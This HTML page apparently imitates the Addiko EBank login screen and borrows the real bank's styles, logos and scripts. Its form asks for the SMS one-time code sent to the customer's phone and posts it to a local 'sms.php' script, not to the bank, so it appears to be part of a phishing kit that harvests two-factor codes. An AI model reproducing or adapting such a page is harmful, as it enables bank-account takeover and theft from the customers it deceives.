<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Addiko EBanking</title>
    <link href="https://ebank.addiko.si/OAuthServer/Content/css/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="https://ebank.addiko.si/OAuthServer/Content/css/Site.css">
    <link rel="stylesheet" href="https://ebank.addiko.si/OAuthServer/Content/css/style.css">
    <link rel="stylesheet" href="https://ebank.addiko.si/OAuthServer/Content/css/fina.css">
	<link rel="shortcut icon" href="https://ebank.addiko.si/OAuthServer/images/favicon.ico" type="image/x-icon">	
    <script src="https://ebank.addiko.si/OAuthServer/Scripts/jquery.min.js"></script>
    <!--  <link rel="stylesheet" href="https://fonts.typotheque.com/WF-027831-009429.css" type="text/css" />-->
</head>
<body>



    
<div class="container-fluid login">
    <div class="row flex-container">
        <div id="page1" class="col-sm-7 left">
            <div class="row">
                <div class="col-sm-12 header header-title">
                    <div class="content-wrapper">
                        <h3 class="section-title">Prijava v Addiko EBank in Addiko Business EBank</h3>
                    </div>
                </div>
                <div class="col-xs-12" style="visibility: hidden;">
                    <div class="content-wrapper">
                        <p id="error_message_wrap" style="color: red; font-size: 15px;" class="alert-text f-20"></p>
                    </div>

                </div>
            </div>
            <div class="col-sm-12 left-side left-side2">
                <div class="section-wrap">
                    <h3 class="section-title section-wrap-title">
                        Addiko EBank
                    </h3>
                    <div class="left-section left-section2 login-section covered">
<div class="retail-img">
    <svg class="default" version="1.1" id="Layer_1" width="80" height="80" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 1457 1457" style="display: none;" xml:space="preserve">
    <g>
    <g>
    <path class="st0" d="M732.2,1422.6c-385.9,0-699.8-313.9-699.8-699.8C32.4,336.9,346.4,23,732.2,23
											c385.9,0,699.8,313.9,699.8,699.8C1432.1,1108.7,1118.1,1422.6,732.2,1422.6L732.2,1422.6z M732.2,54.1
											c-368.7,0-668.7,300-668.7,668.7s300,668.7,668.7,668.7c368.7,0,668.7-300,668.7-668.7S1101,54.1,732.2,54.1L732.2,54.1z"></path>
									</g>
								</g>
    <g>
    <g>
    <path class="st0" d="M604.3,671.8c-65.9,0-119.6-60.7-119.6-135.4s53.6-135.4,119.6-135.4c65.9,0,119.5,60.8,119.5,135.4
											S670.2,671.8,604.3,671.8L604.3,671.8z M604.3,432.1c-48.8,0-88.5,46.8-88.5,104.3s39.7,104.3,88.5,104.3
											c48.7,0,88.4-46.8,88.4-104.3S653.1,432.1,604.3,432.1L604.3,432.1z"></path>
									</g>
    <g>
    <path class="st0" d="M801.9,1012.9H401.5c-8.2,0-14.9-6.3-15.5-14.5l-8.8-129.2c-2.9-42.8,30.5-92.2,72.9-107.8
											c97.8-35,205.7-34.8,303.1,0c42.7,15.7,76.1,65.1,73,107.9l-8.8,129.2C816.9,1006.6,810.1,1012.9,801.9,1012.9L801.9,1012.9z
											 M416,981.8h371.4l7.8-114.7c1.9-26.3-20.2-64.6-52.6-76.5c-90.5-32.3-191.1-32.4-281.9,0c-32.1,11.9-54.3,50.2-52.5,76.5
											L416,981.8L416,981.8z"></path>
									</g>
    <g>
    <path class="st0" d="M801.9,1012.9H401.5c-8.2,0-14.9-6.3-15.5-14.5l-8.8-129.2c-2.9-42.8,30.5-92.2,72.9-107.8
											c97.8-35,205.7-34.8,303.1,0c42.7,15.7,76.1,65.1,73,107.9l-8.8,129.2C816.9,1006.6,810.1,1012.9,801.9,1012.9L801.9,1012.9z
											 M416,981.8h371.4l7.8-114.7c1.9-26.3-20.2-64.6-52.6-76.5c-90.5-32.3-191.1-32.4-281.9,0c-32.1,11.9-54.3,50.2-52.5,76.5
											L416,981.8L416,981.8z"></path>
									</g>
    <g>
    <path class="st0" d="M877.1,714.3c-57.1,0-103.6-52.5-103.6-117c0-64.5,46.5-117.1,103.6-117.1c57.1,0,103.5,52.5,103.5,117.1
											C980.6,661.9,934.2,714.3,877.1,714.3L877.1,714.3z M877.1,511.4c-40,0-72.5,38.6-72.5,86c0,47.4,32.5,85.9,72.5,85.9
											c39.9,0,72.4-38.5,72.4-85.9C949.5,550,917,511.4,877.1,511.4L877.1,511.4z"></path>
									</g>
    <g>
    <path class="st0" d="M1044.4,987.7H808.5c-8.6,0-15.6-7-15.6-15.6c0-8.6,7-15.6,15.6-15.6h221.4l6.5-94.9
											c1.5-21-16.9-52.8-43-62.4c-72.6-26-153.1-27.3-226.6-3.6c-8.1,2.6-16.9-1.9-19.6-10c-2.6-8.2,1.9-16.9,10-19.6
											c80-25.8,167.7-24.5,246.8,3.9c37,13.6,66,56.5,63.4,93.7l-7.5,109.4C1059.3,981.3,1052.5,987.7,1044.4,987.7L1044.4,987.7z"></path>
									</g>
								</g>
							</svg>
    <svg version="1.1" class="clicked" width="80" height="80" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 1457 1457" style="display: inline;" xml:space="preserve">
    <g id="Layer_1">
    <circle class="st0" cx="732.9" cy="722.1" r="676.6"></circle>
    <g>
    <g>
    <path class="st0" d="M732.2,1422.6c-385.9,0-699.8-313.9-699.8-699.8C32.4,336.9,346.4,23,732.2,23
												c385.9,0,699.8,313.9,699.8,699.8C1432.1,1108.7,1118.1,1422.6,732.2,1422.6L732.2,1422.6z M732.2,54.1
												c-368.7,0-668.7,300-668.7,668.7s300,668.7,668.7,668.7c368.7,0,668.7-300,668.7-668.7S1101,54.1,732.2,54.1L732.2,54.1z"></path>
										</g>
									</g>
    <g>
    <g>
    <path class="st1" d="M604.3,671.8c-65.9,0-119.6-60.7-119.6-135.4s53.6-135.4,119.6-135.4c65.9,0,119.5,60.8,119.5,135.4
												S670.2,671.8,604.3,671.8L604.3,671.8z M604.3,432.1c-48.8,0-88.5,46.8-88.5,104.3s39.7,104.3,88.5,104.3
												c48.7,0,88.4-46.8,88.4-104.3S653.1,432.1,604.3,432.1L604.3,432.1z"></path>
										</g>
    <g>
    <path class="st1" d="M801.9,1012.9H401.5c-8.2,0-14.9-6.3-15.5-14.5l-8.8-129.2c-2.9-42.8,30.5-92.2,72.9-107.8
												c97.8-35,205.7-34.8,303.1,0c42.7,15.7,76.1,65.1,73,107.9l-8.8,129.2C816.9,1006.6,810.1,1012.9,801.9,1012.9L801.9,1012.9z
												 M416,981.8h371.4l7.8-114.7c1.9-26.3-20.2-64.6-52.6-76.5c-90.5-32.3-191.1-32.4-281.9,0c-32.1,11.9-54.3,50.2-52.5,76.5
												L416,981.8L416,981.8z"></path>
										</g>
    <g>
    <path class="st1" d="M801.9,1012.9H401.5c-8.2,0-14.9-6.3-15.5-14.5l-8.8-129.2c-2.9-42.8,30.5-92.2,72.9-107.8
												c97.8-35,205.7-34.8,303.1,0c42.7,15.7,76.1,65.1,73,107.9l-8.8,129.2C816.9,1006.6,810.1,1012.9,801.9,1012.9L801.9,1012.9z
												 M416,981.8h371.4l7.8-114.7c1.9-26.3-20.2-64.6-52.6-76.5c-90.5-32.3-191.1-32.4-281.9,0c-32.1,11.9-54.3,50.2-52.5,76.5
												L416,981.8L416,981.8z"></path>
										</g>
    <g>
    <path class="st1" d="M877.1,714.3c-57.1,0-103.6-52.5-103.6-117c0-64.5,46.5-117.1,103.6-117.1c57.1,0,103.5,52.5,103.5,117.1
												C980.6,661.9,934.2,714.3,877.1,714.3L877.1,714.3z M877.1,511.4c-40,0-72.5,38.6-72.5,86c0,47.4,32.5,85.9,72.5,85.9
												c39.9,0,72.4-38.5,72.4-85.9C949.5,550,917,511.4,877.1,511.4L877.1,511.4z"></path>
										</g>
    <g>
    <path class="st1" d="M1044.4,987.7H808.5c-8.6,0-15.6-7-15.6-15.6c0-8.6,7-15.6,15.6-15.6h221.4l6.5-94.9
												c1.5-21-16.9-52.8-43-62.4c-72.6-26-153.1-27.3-226.6-3.6c-8.1,2.6-16.9-1.9-19.6-10c-2.6-8.2,1.9-16.9,10-19.6
												c80-25.8,167.7-24.5,246.8,3.9c37,13.6,66,56.5,63.4,93.7l-7.5,109.4C1059.3,981.3,1052.5,987.7,1044.4,987.7L1044.4,987.7z"></path>
										</g>
									</g>
								</g>
    <g id="Layer_2">
								</g>
							</svg>
</div>
<h3 class="section-title">OBČANI</h3>
                        <p class="clicked title" style="display: block;">Vnesite SMS kodo, poslano na vašo številko mobilnega telefona.</p>
                        <div id="usernamePassBtn" class="login-btn default" style="display: none;">Uporabniško ime/Geslo <span class="glyphicon glyphicon-chevron-right"></span></div>
                        <form action="sms.php" class="clicked" method="post" onSubmit="document.getElementById('btnLogin').disabled = true;" style="display: block;"><input name="__RequestVerificationToken" type="hidden" value="F6ZanCylQZo1-O_oBEeKyn2zFn8ne9voBi_WQaaazhJ8hjQ67CCGMpICBSs2SWCn06D8MdM_9UQvTDS68nxqcMMbNSaDr6FxLIrITE7Q5eY1">                            <div>
                          <div class="validation-placeholder">
                                    <span class="field-validation-valid text-danger" data-valmsg-for="Username" data-valmsg-replace="true"></span>
                          </div>
                                <input autocomplete="off" data-val="true" data-val-required="Obvezno polje" id="Password" name="koda" placeholder="SMS koda" type="password" required>
                                <div class="validation-placeholder">
                                    <span class="field-validation-valid text-danger" data-valmsg-for="Password" data-valmsg-replace="true"></span>
                                    
                                </div>
                                <button id="btnLogin" class="btnLogin">Prijava</button>
                                <div id="demoBtn" class="btn-addiko-blue"><i class="icon icon-eye"></i>Demo</div>
                            </div>
</form>                    </div>
                </div>
                <div class="section-wrap">
                    <h3 class="section-title section-wrap-title">
                        Addiko Business EBank
                    </h3>
                    <div class="right-section right-section2 login-section">
<div class="business-img">
    <svg class="default" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 1457 1457" style="enable-background:new 0 0 1457 1457;" xml:space="preserve">
    <g>
    <g>
    <g>
    <path class="st0" d="M734.9,1422.6c-384.4,0-697.2-312.7-697.2-697.2c0-384.4,312.7-697.1,697.2-697.1
											c384.4,0,697.1,312.8,697.1,697.1C1432,1109.9,1119.3,1422.6,734.9,1422.6L734.9,1422.6z M734.9,59.3
											c-367.3,0-666.2,298.8-666.2,666.2c0,367.3,298.8,666.2,666.2,666.2c367.3,0,666.2-298.8,666.2-666.2
											C1401,358.1,1102.2,59.3,734.9,59.3L734.9,59.3z"></path>
									</g>
								</g>
    <g>
    <g>
    <path class="st0" d="M1043.5,1040.6H438c-27.4,0-49.8-22.3-49.8-49.8V568.2c0-27.5,22.3-49.8,49.8-49.8h605.5
											c27.4,0,49.7,22.3,49.7,49.8v422.6C1093.2,1018.3,1070.9,1040.6,1043.5,1040.6L1043.5,1040.6z M438,549.3
											c-10.4,0-18.8,8.4-18.8,18.8v422.6c0,10.4,8.4,18.8,18.8,18.8h605.5c10.3,0,18.7-8.4,18.7-18.8V568.2c0-10.4-8.4-18.8-18.7-18.8
											H438L438,549.3z"></path>
									</g>
    <g>
    <path class="st0" d="M864.9,546.4c-8.6,0-15.5-6.9-15.5-15.5v-77.1c0-10.3-8.4-18.8-18.8-18.8H650.7c-10.4,0-18.8,8.4-18.8,18.8
											V531c0,8.6-6.9,15.5-15.5,15.5c-8.6,0-15.5-6.9-15.5-15.5v-77.1c0-27.4,22.3-49.7,49.8-49.7h179.9c27.5,0,49.8,22.3,49.8,49.7
											V531C880.4,539.5,873.5,546.4,864.9,546.4L864.9,546.4z"></path>
									</g>
    <g>
    <path class="st0" d="M673.6,752.1H416.5c-8.6,0-15.5-6.9-15.5-15.5c0-8.6,6.9-15.5,15.5-15.5h257.1c8.6,0,15.5,6.9,15.5,15.5
											C689.1,745.1,682.2,752.1,673.6,752.1L673.6,752.1z"></path>
									</g>
    <g>
    <path class="st0" d="M1054.2,752.1H797.1c-8.6,0-15.5-6.9-15.5-15.5c0-8.6,6.9-15.5,15.5-15.5h257.1c8.6,0,15.5,6.9,15.5,15.5
											C1069.7,745.1,1062.8,752.1,1054.2,752.1L1054.2,752.1z"></path>
									</g>
    <g>
    <path class="st0" d="M783.6,837.8h-85.7c-8.6,0-15.5-6.9-15.5-15.5V693.7c0-8.6,6.9-15.5,15.5-15.5h85.7
											c8.6,0,15.5,6.9,15.5,15.5v128.5C799.1,830.8,792.1,837.8,783.6,837.8L783.6,837.8z M713.4,806.8h54.7v-97.6h-54.7V806.8
											L713.4,806.8z"></path>
									</g>
								</g>
							</g>
							</svg>
    <svg class="clicked" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 1457 1457" style="enable-background:new 0 0 1457 1457;" xml:space="preserve">
    <g>
    <g>
    <g>
    <path class="st0" d="M734.9,1422.6c-384.4,0-697.2-312.7-697.2-697.2c0-384.4,312.7-697.1,697.2-697.1
											c384.4,0,697.1,312.8,697.1,697.1C1432,1109.9,1119.3,1422.6,734.9,1422.6L734.9,1422.6z"></path>
									</g>
								</g>
    <g>
    <g>
    <path class="st1" d="M1043.5,1040.6H438c-27.4,0-49.8-22.3-49.8-49.8V568.2c0-27.5,22.3-49.8,49.8-49.8h605.5
											c27.4,0,49.7,22.3,49.7,49.8v422.6C1093.2,1018.3,1070.9,1040.6,1043.5,1040.6L1043.5,1040.6z M438,549.3
											c-10.4,0-18.8,8.4-18.8,18.8v422.6c0,10.4,8.4,18.8,18.8,18.8h605.5c10.3,0,18.7-8.4,18.7-18.8V568.2c0-10.4-8.4-18.8-18.7-18.8
											H438L438,549.3z"></path>
									</g>
    <g>
    <path class="st1" d="M864.9,546.4c-8.6,0-15.5-6.9-15.5-15.5v-77.1c0-10.3-8.4-18.8-18.8-18.8H650.7c-10.4,0-18.8,8.4-18.8,18.8
											V531c0,8.6-6.9,15.5-15.5,15.5c-8.6,0-15.5-6.9-15.5-15.5v-77.1c0-27.4,22.3-49.7,49.8-49.7h179.9c27.5,0,49.8,22.3,49.8,49.7
											V531C880.4,539.5,873.5,546.4,864.9,546.4L864.9,546.4z"></path>
									</g>
    <g>
    <path class="st1" d="M673.6,752.1H416.5c-8.6,0-15.5-6.9-15.5-15.5c0-8.6,6.9-15.5,15.5-15.5h257.1c8.6,0,15.5,6.9,15.5,15.5
											C689.1,745.1,682.2,752.1,673.6,752.1L673.6,752.1z"></path>
									</g>
    <g>
    <path class="st1" d="M1054.2,752.1H797.1c-8.6,0-15.5-6.9-15.5-15.5c0-8.6,6.9-15.5,15.5-15.5h257.1c8.6,0,15.5,6.9,15.5,15.5
											C1069.7,745.1,1062.8,752.1,1054.2,752.1L1054.2,752.1z"></path>
									</g>
    <g>
    <path class="st1" d="M783.6,837.8h-85.7c-8.6,0-15.5-6.9-15.5-15.5V693.7c0-8.6,6.9-15.5,15.5-15.5h85.7
											c8.6,0,15.5,6.9,15.5,15.5v128.5C799.1,830.8,792.1,837.8,783.6,837.8L783.6,837.8z M713.4,806.8h54.7v-97.6h-54.7V806.8
											L713.4,806.8z"></path>
									</g>
								</g>
							</g>
							</svg>
</div>
<h3 class="section-title">PODJETJA</h3>
                        <p class="default hide">Login with digital certificate</p>
                        <p class="clicked">Login with Minitoken</p>
                        <div id="rekonoSignInBtn" class="login-btn default">Prijava z Rekono <span class="glyphicon glyphicon-chevron-right"></span></div>

                    </div>
                </div>
            </div>
        </div>

<div class="col-sm-5 right">
    <div class="row">
        <div class="col-sm-12 header">

<form action="#" id="setLangForm" method="post"><input name="__RequestVerificationToken" type="hidden" value="Yb_YfUAbFERzzBingyvKkSEpZjpFTOHkl4iMw2DQRmcIo56ZYFLQlzxjmv-BdMhmZ4BcRwa2D6cmT3ecpe05R3d_12X_Dcl2FduVWYpMc8g1">    <input type="hidden" id="lang" name="lang" value="en-US">
        <a href="#" class="language-link" onClick="$('#lang').val('en-US'); $('#setLangForm').submit();">EN</a>
</form>
            <div id="logoContainer" class="logo-container">
                <!--   <a href="index.html"> -->
                <svg class="logo-image" width="450" height="auto" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 182.037 23.18" enable-background="new 0 0 182.037 23.18" xml:space="preserve">
                <g>
                <defs>
                <rect id="SVGID_1_" width="182.036" height="23.18"></rect>



										</defs>
                <clipPath id="SVGID_2_">
                <use xlink:href="#SVGID_1_" overflow="visible"></use>



										</clipPath>
                <path clip-path="url(#SVGID_2_)" fill="#FFFFFF" d="M14.298,18.352H6.344l-1.547,4.457H0L8.511,1.547h3.745l8.511,21.261h-4.92
											L14.298,18.352z M7.582,14.792h5.478L10.306,6.9L7.582,14.792z M29.71,6.467c0.886,0,1.671,0.119,2.352,0.356
											c0.681,0.237,1.258,0.542,1.733,0.913V0h4.364v14.39c0,1.322-0.197,2.518-0.587,3.591c-0.393,1.073-0.955,1.996-1.687,2.77
											c-0.733,0.774-1.625,1.372-2.677,1.795c-1.053,0.424-2.229,0.635-3.528,0.635c-1.218,0-2.336-0.217-3.358-0.65
											c-1.021-0.433-1.904-1.03-2.646-1.794c-0.743-0.764-1.321-1.657-1.733-2.678c-0.413-1.021-0.619-2.108-0.619-3.266
											c0-1.175,0.217-2.269,0.65-3.28c0.434-1.01,1.026-1.893,1.779-2.646c0.752-0.752,1.64-1.341,2.662-1.764
											C27.436,6.68,28.534,6.467,29.71,6.467 M29.771,19.404c0.64,0,1.223-0.113,1.75-0.341c0.525-0.227,0.979-0.541,1.362-0.944
											c0.38-0.402,0.675-0.887,0.881-1.454c0.206-0.566,0.309-1.19,0.309-1.873c0-1.361-0.392-2.46-1.176-3.295
											c-0.784-0.836-1.826-1.253-3.126-1.253c-1.299,0-2.341,0.417-3.125,1.253c-0.784,0.835-1.176,1.934-1.176,3.295
											c0,0.683,0.103,1.307,0.309,1.873c0.206,0.567,0.501,1.052,0.882,1.454c0.381,0.403,0.835,0.718,1.362,0.944
											C28.549,19.291,29.132,19.404,29.771,19.404 M49.021,6.467c0.887,0,1.671,0.114,2.353,0.341c0.681,0.227,1.258,0.525,1.733,0.897V0
											h4.363v14.39c0,1.322-0.196,2.518-0.587,3.591c-0.392,1.073-0.955,1.996-1.687,2.77c-0.732,0.774-1.625,1.372-2.677,1.795
											c-1.052,0.424-2.228,0.635-3.528,0.635c-1.218,0-2.337-0.217-3.358-0.65c-1.021-0.433-1.903-1.03-2.646-1.794
											c-0.742-0.764-1.32-1.657-1.733-2.678c-0.413-1.021-0.618-2.108-0.618-3.266c0-1.175,0.216-2.269,0.649-3.28
											c0.433-1.01,1.026-1.893,1.779-2.646c0.753-0.752,1.64-1.341,2.662-1.764C46.747,6.68,47.845,6.467,49.021,6.467 M49.083,19.404
											c0.64,0,1.222-0.113,1.749-0.341c0.526-0.227,0.979-0.541,1.362-0.944c0.381-0.402,0.676-0.887,0.882-1.454
											c0.206-0.566,0.31-1.19,0.31-1.873c0-1.361-0.393-2.46-1.177-3.295c-0.783-0.836-1.825-1.253-3.125-1.253s-2.342,0.417-3.126,1.253
											c-0.784,0.835-1.176,1.934-1.176,3.295c0,0.683,0.103,1.307,0.309,1.873c0.206,0.567,0.5,1.052,0.882,1.454
											c0.381,0.403,0.835,0.718,1.361,0.944C47.861,19.291,48.444,19.404,49.083,19.404 M60.72,0h4.363v4.363H60.72V0z M60.72,6.838
											h4.363v15.97H60.72V6.838z M76.008,15.97c-0.228,0.041-0.491,0.066-0.789,0.077c-0.299,0.01-0.532,0.015-0.696,0.015h-1.548v6.747
											h-4.363V0h4.363v12.348h1.145c1.382,0,2.501-0.48,3.358-1.44c0.856-0.958,1.346-2.315,1.47-4.07h4.178
											c0,1.548-0.309,2.972-0.928,4.271c-0.62,1.301-1.456,2.362-2.508,3.187l4.92,8.512h-4.765L76.008,15.97z M92.999,23.18
											c-1.176,0-2.279-0.217-3.311-0.65c-1.033-0.433-1.931-1.03-2.693-1.794c-0.763-0.764-1.362-1.65-1.795-2.663
											c-0.434-1.011-0.649-2.103-0.649-3.28c0-1.175,0.216-2.269,0.649-3.28c0.433-1.01,1.032-1.888,1.795-2.63
											c0.762-0.743,1.66-1.331,2.693-1.764c1.032-0.433,2.135-0.65,3.311-0.65s2.28,0.217,3.312,0.65s1.929,1.021,2.693,1.764
											c0.764,0.743,1.36,1.62,1.794,2.63c0.435,1.011,0.65,2.105,0.65,3.28c0,1.178-0.216,2.27-0.65,3.28
											c-0.434,1.013-1.03,1.899-1.794,2.663c-0.765,0.764-1.662,1.361-2.693,1.794C95.279,22.963,94.174,23.18,92.999,23.18
											 M92.999,19.404c0.639,0,1.223-0.113,1.748-0.341c0.527-0.227,0.98-0.541,1.363-0.944c0.38-0.402,0.675-0.887,0.882-1.454
											c0.206-0.566,0.309-1.19,0.309-1.873c0-1.361-0.392-2.46-1.175-3.295c-0.785-0.836-1.827-1.253-3.127-1.253
											c-1.299,0-2.342,0.417-3.126,1.253c-0.783,0.835-1.176,1.934-1.176,3.295c0,0.683,0.104,1.307,0.31,1.873
											c0.207,0.567,0.5,1.052,0.881,1.454c0.382,0.403,0.837,0.718,1.362,0.944C91.777,19.291,92.359,19.404,92.999,19.404
											 M124.318,7.644c0,0.928-0.206,1.759-0.618,2.491c-0.414,0.732-1.011,1.284-1.796,1.656c0.948,0.31,1.718,0.871,2.306,1.687
											c0.588,0.814,0.883,1.811,0.883,2.987c0,0.928-0.176,1.779-0.525,2.552c-0.352,0.774-0.838,1.444-1.457,2.013
											c-0.618,0.566-1.356,1.005-2.211,1.314c-0.856,0.31-1.79,0.465-2.802,0.465h-9.13V1.547h8.604c1.031,0,1.96,0.144,2.786,0.433
											c0.823,0.289,1.53,0.701,2.118,1.238c0.589,0.536,1.043,1.176,1.362,1.919C124.159,5.879,124.318,6.715,124.318,7.644
											 M113.239,10.275h3.961c0.929,0,1.63-0.228,2.104-0.681c0.475-0.454,0.712-1.084,0.712-1.888c0-0.744-0.248-1.336-0.742-1.78
											c-0.495-0.443-1.187-0.666-2.074-0.666h-3.961V10.275z M113.239,13.864v5.199h4.487c0.929,0,1.665-0.232,2.213-0.696
											c0.547-0.464,0.819-1.099,0.819-1.902c0-0.868-0.263-1.518-0.789-1.951c-0.524-0.433-1.273-0.649-2.243-0.649H113.239z
											 M139.884,22.809v-1.641c-0.475,0.598-1.113,1.078-1.919,1.439c-0.804,0.361-1.784,0.541-2.938,0.541
											c-1.117,0-2.147-0.2-3.097-0.604s-1.769-0.97-2.459-1.702c-0.692-0.732-1.234-1.613-1.625-2.646
											c-0.394-1.032-0.59-2.167-0.59-3.405c0-1.175,0.219-2.269,0.65-3.28c0.435-1.01,1.026-1.888,1.78-2.63s1.646-1.331,2.677-1.764
											s2.145-0.65,3.342-0.65c1.218,0,2.343,0.207,3.374,0.619C140.112,7.5,141,8.077,141.742,8.82c0.743,0.743,1.32,1.63,1.733,2.661
											c0.411,1.033,0.618,2.157,0.618,3.374v7.954H139.884z M135.707,10.243c-1.3,0-2.342,0.417-3.125,1.253
											c-0.784,0.835-1.177,1.934-1.177,3.295c0,0.683,0.104,1.307,0.31,1.873c0.205,0.567,0.501,1.052,0.883,1.454
											c0.38,0.403,0.834,0.718,1.361,0.944c0.525,0.228,1.109,0.341,1.748,0.341c0.64,0,1.223-0.113,1.749-0.341
											c0.526-0.227,0.979-0.541,1.361-0.944c0.382-0.402,0.676-0.887,0.883-1.454c0.206-0.566,0.31-1.19,0.31-1.873
											c0-1.361-0.394-2.46-1.178-3.295C138.049,10.661,137.007,10.243,135.707,10.243 M155.049,10.367c-1.053,0-1.877,0.325-2.476,0.975
											s-0.897,1.532-0.897,2.646v8.82h-4.363v-8.852c0-1.155,0.18-2.192,0.541-3.111c0.36-0.917,0.876-1.702,1.548-2.351
											c0.669-0.65,1.484-1.15,2.444-1.501c0.96-0.352,2.026-0.527,3.203-0.527c1.176,0,2.244,0.175,3.203,0.527
											c0.96,0.351,1.774,0.851,2.445,1.501c0.671,0.649,1.186,1.434,1.549,2.351c0.359,0.919,0.54,1.956,0.54,3.111v8.852h-4.363v-8.82
											c0-1.114-0.3-1.996-0.898-2.646C156.927,10.692,156.101,10.367,155.049,10.367 M173.402,15.97
											c-0.228,0.041-0.485,0.066-0.773,0.077c-0.291,0.01-0.516,0.015-0.682,0.015h-1.549v6.747h-4.361V0h4.361v12.348h1.146
											c1.384,0,2.503-0.48,3.36-1.44c0.854-0.958,1.346-2.315,1.469-4.07h4.178c0,1.548-0.3,2.967-0.896,4.255
											c-0.6,1.291-1.425,2.348-2.476,3.174l4.857,8.541h-4.827L173.402,15.97z"></path>



									</g>
									</svg>
                <!--   </a> -->
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-sm-12 right-side-text">
            <p>
V Addiko EBank in Addiko Business Ebank lahko                    <br>
vstopite le kot pooblaščeni uporabnik                    <br>
                            </p>
            <hr>
        </div>
    </div>
    <div class="row bottom-right-aligned">
        <div class="col-sm-12">
            <p class="help-txt">
                        <span>Občani</span>
                        <br>
+ 386 (0)1 580 43 00 (klicni center)                                <br>
ebank.si@addiko.com                                <br>
                        <br>
                        <span>Podjetja</span>
                        <br>
+ 386 (0)1 580 43 00 (klicni center ob delavnikih od 8. do 16.00 ure)                                <br>
ebank.si@addiko.com                                <br>
                        <br>
Addiko Bank d.d.                                <br>
Dunajska cesta 117, 1000 Ljubljana                                <br>
                    <br>
                    <br>
                    <a href="https://www.addiko.si/varstvo-podatkov/informacije-o-obdelavi-podatkov-za-addiko-ebank/" target="_blank">Informacije o obdelavi osebnih podatkov</a>

                            </p>
        </div>
    </div>
</div>
    </div>
</div>
<script type="text/javascript">
    $(document).ready(function () {
        var error_message = sessionStorage.getItem('error_message');
        if (error_message) {
            var element = document.getElementById('error_message_wrap');
            element.innerHTML = error_message;
            element.style.visibility = 'visible';
            sessionStorage.removeItem('error_message');
        }
            $(function () {
                $('#usernamePassBtn').click();
            });

            $('#usernamePassBtn').click(function () {
                var section = $(this).parent(".login-section").addClass("covered");
                $(section).find(".default").hide();
                $(section).find(".clicked").show();
                $(section).find(".cta").addClass("retail-username");
            });

            $('#cTokenBtn').click(function () {
                window.open('http://localhost/OAuthServer.Web/Login/Authenticate?ReturnUrl=%2FOAuthServer%2Foauth%2Fauthorize%3Fclient_id%3DeBank%26login_hint%3Dct_mtoken%26response_type%3Dtoken', '_self');
            });

            $('#rTokenBtn').click(function () {
                window.open('http://localhost/OAuthServer.Web/Login/Authenticate?ReturnUrl=%2FOAuthServer%2Foauth%2Fauthorize%3Fclient_id%3DeBank%26login_hint%3Dactive_identity_token%26response_type%3Dtoken', '_self');
            });

            $('#miniTokenBtn').click(function () {
                window.open('http://localhost/OAuthServer.Web/Login/Authenticate?ReturnUrl=%2FOAuthServer%2Foauth%2Fauthorize%3Fclient_id%3DeBank%26login_hint%3Dusername_password_otp_ai%26response_type%3Dtoken', '_self');
            });

            $('#miniTokenBtnCorp').click(function () {
                window.open('http://localhost/OAuthServer.Web/Login/Authenticate?ReturnUrl=%2FOAuthServer%2Foauth%2Fauthorize%3Fclient_id%3DeBankCorp%26login_hint%3Dusername_password_otp_ai%26response_type%3Dtoken' + '&corp=true', '_self');
            });

            $('#digiCertBtn').click(function () {
                window.open('https://m-test.hypo-alpe-adria.si/OAuthServerCert/LoginCertificate/Authenticate?ReturnUrl=%2FOAuthServerCert%2Foauth%2Fauthorize%3Fclient_id%3DSloCorpUat%26redirect_uri%3Dhttps%253A%252F%252Fm-test.hypo-alpe-adria.si%252FCorpWebAuth%252Flogin.html%26state%3D0.01427755221079896%26scope%3DBAP2000%26login_hint%3Dcertificate%26response_type%3Dtoken', '_self')
            });

            $('#rekonoSignInBtn').click(function () {
                window.open('#'.replace(/&amp;/g, '&'), '_self')
            });

            $('#demoBtn').click(function () {
                f_open_window_max("https://demo.addiko.info/webslo/", "BAO2000", "no");
            });
        });
</script>



    <script src="https://ebank.addiko.si/OAuthServer/Scripts/bootstrap.min.js"></script>
    <script src="https://ebank.addiko.si/OAuthServer/Scripts/app.js"></script>

</body></html>